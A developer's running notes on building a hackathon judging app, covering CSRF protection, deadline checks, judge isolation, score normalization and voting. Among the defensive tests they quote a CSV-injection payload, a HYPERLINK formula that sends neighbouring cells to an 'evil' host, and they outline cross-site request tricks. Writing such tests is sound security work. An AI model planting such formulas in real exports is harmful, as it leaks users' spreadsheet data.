# Notes for the write-up

Running log of decisions, surprises and bugs. Raw material for the post.

## 2026-09-26 — Reading the organizer files before writing code

What `fixtures.json` actually contains (checked with a script, not assumed):

- 8 tracks, 30 judges, 40 teams (91 unique member emails, no overlap with judges), 41 projects, **126** scores (not ~136 as I first guessed).
- Every score has exactly 3 criteria: functionality, quality, innovation. Values are only 2-5, and nobody gave a 1.
- 51 of 126 comments are empty.
- **Duplicate submission:** `prj_07` and `prj_41` are both "Dry Harbour" from team `tm_07`, same repo. `prj_41` was
  resubmitted at 17:57, 3 minutes before the 18:00 close. **Both have scores**, some from the same judges
  (jdg_19, jdg_21 and jdg_26 scored both). So picking a canonical row is not enough; we must also make sure
  the scores on the other row are not counted twice.
- **Flat judge:** `jdg_07` gave 4/4/4 to all 3 projects they scored, so their standard deviation is 0.
  jdg_01 and jdg_23 each have only 1 score, so they are "flat" by default. Normalization must handle both cases.
- Reviews per project: 26 projects have 3, 8 have 2, 3 have 4, 4 have 5. No project has 0 reviews, but the code
  must still handle 0 reviews for the live demo event.
- Judge load is very uneven: jdg_24 has 11 reviews, while jdg_01 and jdg_23 have 1 each.
- No judge scored outside their tracks, and there are no dangling references.

What `run.py` taught me:

- The submit probe is a **JSON** POST with a cookie and no CSRF token. If the CSRF layer rejects it with 403,
  the check "passes" for the wrong reason. Design decision: JSON endpoints require `Content-Type: application/json`
  (a cross-site HTML form cannot send that without a CORS preflight, which we never allow), and the deadline
  check runs in the handler itself, so the 4xx really comes from the closed deadline.
- Only the first 3 fixture titles are searched for ("Glass Signal", "Small Meadow", "Deep Compass"), and
  only on page one of the gallery. Pagination order matters.
- CSV check = status 200 and a comma in the first line.

## 2026-09-27 — Seeding

- Duplicate rule: a team has one project per event; when there are several, the **latest** submission wins
  (prj_41 at 17:57 is what the team meant to submit) and earlier ones get `duplicate_of_id`. A partial unique
  index (`team_id WHERE duplicate_of_id IS NULL`) makes the DB refuse any new second project.
- Demo session tokens must be fixed (so `.dogfood.toml` survives restarts), which means they are public.
  A public organizer token on a real deployment = instant takeover. So they only exist while `DEMO_SESSIONS=1`;
  with `DEMO_SESSIONS=0` boot deletes them. Threat-model item.
- bcrypt is deliberately slow (~0.25s). Hashing 123 seeded accounts one by one would add ~30s to boot, so the one
  shared demo password is hashed once. Fine for demo accounts, and documented as such.
- Gotcha: `docker compose up -d --build` piped to Out-Null in PowerShell kept the old container. Always read build output.

## 2026-09-27 — Auth

- CSRF is an **app-wide** FastAPI dependency, not per-route, so a new route cannot forget it. Unsafe requests
  must be JSON (cross-site forms can't send application/json without a CORS preflight, which we never answer)
  or carry a token. A test proves the classic `enctype="text/plain"` fake-JSON trick gets a 403.
- Anonymous forms (login/register) use a double-submit cookie, so login CSRF is covered too.
- Bug caught by a test: registering wrote the audit row *before* the user row -> FK violation. SQLAlchemy's
  unit of work only orders inserts it knows are related, and audit_log has no ORM relationship to users.
  Fix: flush the user first. Would have been a 500 on Postgres in the demo.
- Unknown email is checked against a dummy bcrypt hash, so "no such user" and "wrong password" take the same
  time and return the same body (no account enumeration).

## 2026-09-27 — Gallery, submission, deadline

- run.py's submit probe carries no event id. Rule: no `event_id` -> use the event of the caller's team. The demo
  participant is on tm_01 (closed fixture event), so the refusal is the honest one: **409 `submissions_closed`**,
  not a 403 from auth or CSRF. Tests assert the error code, not just "some 4xx".
- Deadline is read from the **database clock** (`SELECT now()` on Postgres) and checked on create AND edit,
  before the membership check, so a closed event answers "closed" to everyone.
- Drafts return **404** (not 403) to non-members so their existence is not leaked.
- Only http(s) URLs are stored, so `javascript:` links can never land in an href. Search escapes LIKE
  wildcards (`%` finds nothing instead of everything).
- Gallery is alphabetical: neutral, doesn't reward early or late submission, and keeps the first fixture
  titles on page one for the checker.
- ORM gotcha avoided: replacing a project's tag rows with new objects that have the same primary key makes
  SQLAlchemy INSERT before DELETE -> unique violation. Reuse existing rows instead.
- Windows gotcha: PowerShell 5.1 `Get-Content | Set-Content` turned `·` into `Â·` and added a BOM, and `>`
  writes UTF-16. Never edit templates or redirect output through PowerShell.
## 2026-09-27 — Teams and events

- Invite link = 192-bit random token in the URL. Opening it (GET) only shows a confirmation page; joining is a
  CSRF-protected POST. Otherwise `<img src=".../teams/join/TOKEN">` on any site would silently add the viewer.
- Links can be rotated; the old one 404s immediately. Referrer-Policy `same-origin` keeps the token from leaking
  to external sites through the Referer header.
- Team-size race: `SELECT ... FOR UPDATE` on the team row serialises joins on Postgres; the
  `uq_one_team_per_event` constraint is the backstop. E2E on Docker: two simultaneous joins for the last slot ->
  one 200, one 409, team size stays at the limit.
- Only participants can be on teams (judges/organizers on teams = conflict of interest).
- Deadline moves get their own audit action (`event.deadline_change`) with old and new values.
- Bugs caught by tests: `int(value or 4)` silently turned team size 0 into 4 (falsy zero!), and tracks added
  with `db.add` did not appear in the already-loaded `event.tracks` collection. Append through relationships.
- An inline `onclick` would have been silently blocked by our own CSP. Kept the CSP, dropped the inline JS.
- Test suite went from 138s to 77s by using bcrypt cost 4 in tests only (BCRYPT_ROUNDS env var).
## 2026-09-27 — Judge isolation and CSV (run.py 7/7)

- `/api/judge/scores?judge=X`: judges get 403 for ANY other id, including ids that don't exist, so the endpoint
  can't be used to discover which judge ids are real. Staff asking for an unknown id get 404 (they may know).
- Scoring needs an assignment AND the project's track in the judge's tracks. Test: an organizer mis-assigns
  judge_a to a trk_03 project; judge_a still gets 404 and no score row is written. Defence in depth.
- A judge scoring "someone else's" project writes their own row (unique judge+project); they can never
  overwrite another judge's row, because the row is looked up by (current_user.id, project_id).
- Score values: whole numbers 1-5 only ("4.5" and "6" are 422), every rubric criterion required, unknown keys
  rejected. The DB CHECK is the backstop.
- Every score create/update is audited with before and after values.
- CSV injection: cells starting with = + - @ TAB CR get a leading apostrophe. Test uses a
  `=HYPERLINK("http://evil/?"&A1,...)` title, which would otherwise leak neighbouring cells when opened.
- run.py 7/7 PASS but .dogfood.toml still claims only T1: the T2 *tier* also needs assignment, rubric editing,
  dashboard, normalization, publishing and the audit UI. Passing the checker != finishing the tier.
- Test-writing lesson: asserting `"scores" not in resp.text` failed because the error message says "scores".
  Assert on structure (no `scores` key, no `weighted_total`), not on words.
## 2026-09-27 — Assignment, rubric editor, progress dashboard

- Auto-assign: most-constrained project first (fewest eligible judges), least-loaded judge per slot, ties by
  id -> deterministic. Add-only, so re-running is safe and never drops a scored assignment. On the fixture
  event it adds exactly 8 assignments (the 8 projects with only 2 reviews) and then 0 on a second run.
- The algorithm is a pure function (`plan_assignments`) with no DB, so it has unit tests of its own:
  balance, no cross-track, shortfall reported, most-constrained-first, idempotent.
- Rubric rule: once any score exists, only weights and labels can change (adding a criterion would make
  every existing score incomplete). Weight changes are audited with before/after; totals recompute.
- Nasty bug: a test passed alone and failed after another test. Cause: relationships without `order_by`
  return insertion order inside a session but arbitrary DB order after a reload. Tags, and tracks/prizes of
  organizer-created events (random ids!) would have shown up shuffled. Fixed with explicit ordering and a test
  that compares the create response with a fresh reload.
- SQLAlchemy Row objects in a set: `(a, b) in rows_set` is not something to rely on; build plain tuples.
## 2026-09-28 — Normalization, results, publishing, audit viewer

- Flat judges abstain (weight 0) rather than vote "average" (z = 0). Including their zeros would pull every
  project they reviewed toward the middle, which hurts strong projects and helps weak ones. Test proves it.
- Judges with <3 scores get weight n/3; projects whose reviewer weights sum < 2 are flagged low confidence.
- Hand-built test: a harsh judge's favourite (raw 3) outranks a generous judge's least favourite (raw 4)
  after normalization. That one test is the whole argument for normalizing.
- Fixture surprise: jdg_01's ONLY score was on prj_07, the superseded duplicate. Excluding duplicates removes
  jdg_01 from the results entirely. Correct, but worth explaining in JUDGING.md.
- Results are 403 to everyone but staff until published; the public view drops per-judge data and flags.
  Publishing requires submissions to be closed. Publish and unpublish are both audited.
- Near-miss: re-running run.py while Docker Desktop was down overwrote acceptance-report.txt with FAILs.
  Only regenerate the report when the stack is confirmed up.
## 2026-09-28 — T2 complete, docs, normalization proof

- Judge invites: one-time, 7-day, SHA-256-stored links (no email offline, so the organizer hands the link over).
  Existing participants can't be "invited" into judging; that is an admin-only role change, refused for anyone
  on a team. Roles are read from the DB on every request, so a demotion hits live sessions immediately.
- Bug: after editing a judge's tracks, the response showed the OLD tracks. Same family as before: the loaded
  collection didn't see rows added/deleted through the session. `db.refresh`.
- Wrote JUDGING.md from real numbers (scripts/normalization_report.py): 39 of 40 projects move. Checking my
  own first draft against the data caught 3 wrong explanations: I had blamed "harsh judges" for two big rises
  that are really the near-flat-judge weakness (sigma 0.094 and 0.1). Kept them in, labelled as the weakness.
  The honest version is a better argument than the tidy one.
- THREAT-MODEL.md cites 47 test names as evidence; a script checks every one exists.
- Final: fresh `docker compose down -v && up`, run.py "claimed T1 T2, verified T1 T2".
## 2026-09-28 — T3: voting, ballot, comments

- Votes: participants only, not for your own team, only inside the window (DB clock), one per project by a
  DB unique constraint. On Postgres, two identical votes fired at the same moment -> one 200, one 409.
  The app-level "already voted?" check alone would have let both through; the constraint is the real rule.
- Tallies hidden from non-staff until the window closes (so no one can watch the count and target a rival).
- Ballot order: random.Random(sha256(event:user)).shuffle - stable per user (no reload-until-first),
  different across users (no position bias). Pure function, unit-tested.
- Anti-abuse honesty: Sybil accounts are NOT stopped (open registration, no email offline). Staff get a
  signal instead: votes from accounts created after voting opened.
- New tables instead of new columns on `events`, so an existing database gets them from create_all without
  a migration.
- run.py has no T3 checks, so claiming T3 prints "claimed but not verified: T3". Explained in the README;
  backed by 24 tests + a Docker E2E run.